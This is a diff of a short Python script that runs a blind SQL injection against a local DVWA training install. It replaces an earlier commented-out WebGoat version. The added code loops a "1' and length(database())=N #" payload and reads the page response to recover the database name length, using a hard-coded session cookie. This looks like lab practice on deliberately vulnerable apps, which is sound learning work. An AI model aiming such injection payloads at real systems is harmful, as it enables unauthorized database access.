@@ -1,38 +1,41 @@
 import requests
+from bs4 import BeautifulSoup as bs
 
-url ="http://10.0.2.15/WebGoat/attack"
-# cookies = {"JSESSIONID":"D48EDBF885B77BC1536D15068E139421", "acopendivids":"swingset,jotto,phpbb2,redmine","acgroupswithpersist":"nada"}
-# def find_len():
-#     flen = 0
-    
-#     while 1:
-#         flen += 1
-#         pa = "account_number"
-#         attack = "101 AND {flen}=LENGTH(SELECT name FROM pins WHERE cc_number=4321432143214321)"
-#         params = {pa:attack, 'SUBMIT':"Go%21"}
-#         response = requests.get(url,params,cookies)
-#         print(response.status_code)
-#         if "Account number is valid" in response.text:
-#             print(flen)
-#             break
+#############################직접 입력해야하는 값들#############################
 
+url ="http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/"
 
-# url = 'http://10.0.2.15/WebGoat/attack'
+add_url = '?id=1&Submit=Submit&'
 
-headers = {
-    'Host': '10.0.2.15',
-    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Accept-Encoding': 'gzip, deflate',
-    'Connection': 'close',
-    'Referer': 'http://10.0.2.15/',
-    'Upgrade-Insecure-Requests': '1',
-    'Authorization': 'Basic d2ViZ29hdDp3ZWJnb2F0'
-}
+session = "PHPSESSID"
+session_val = "sdoop6tab6tochvo3jvoakevsg"
 
-response = requests.get(url, headers=headers)
+cookies = {session: session_val,"security":"low"}
 
+check_str ='User ID exists in the database.'
 
+##############################################################################
+
+def check_length():
+    len = 0
+    while True:
+        len = len + 1
+        payload = {
+            "id": "1' and length(database())={} #".format(len),
+            "Submit": "Submit"
+                }
+        res = requests.post(url, cookies=cookies, params=payload)
+        soup = bs(res.text, "html.parser")
+        pre_tag = soup.find('pre')
+        if pre_tag is not None:
+            if pre_tag.text == check_str:
+                print(len)
+                print('length is: ' + str(len))
+                print('---------------------------------------------+')
+                return len
+
+check_length()
 # Process the response
-print(response.text)    
+
+
+ 
